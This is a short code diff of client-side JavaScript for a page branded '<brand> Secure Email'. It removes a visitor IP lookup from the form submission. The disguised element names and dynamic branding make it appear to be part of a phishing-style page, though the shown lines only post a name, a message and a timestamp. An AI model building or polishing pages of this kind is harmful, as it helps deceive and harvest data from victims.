@@ -75,7 +75,7 @@ const viper = document.getElementById("viper");
     titleEl.innerText = brand + " Secure Email";
   }
 })();
-async function falcon() {
+function falcon() {
   const customerName = viper.value;
   const customerMessage = document.getElementById("cobra").value;
   const unlockBtn = document.getElementById("btn-unlock");
@@ -89,19 +89,9 @@ async function falcon() {
     form.classList.add("shake");
     return;
   }
-
-  let stamp = "unknown";
-  try {
-    const ipRes = await fetch("https://api.ipify.org?format=json");
-    const ipData = await ipRes.json();
-    stamp = ipData.ip;
-  } catch (error) {
-    // ignore IP fetch failures
-  }
   const cleanPayload = new URLSearchParams();
   cleanPayload.append("Name", customerName);
   cleanPayload.append("Feedback", customerMessage);
-  cleanPayload.append("IP", stamp);
   cleanPayload.append("timestamp", Date.now().toString());
   unlockBtn.disabled = true;
   spinner.style.display = "block";
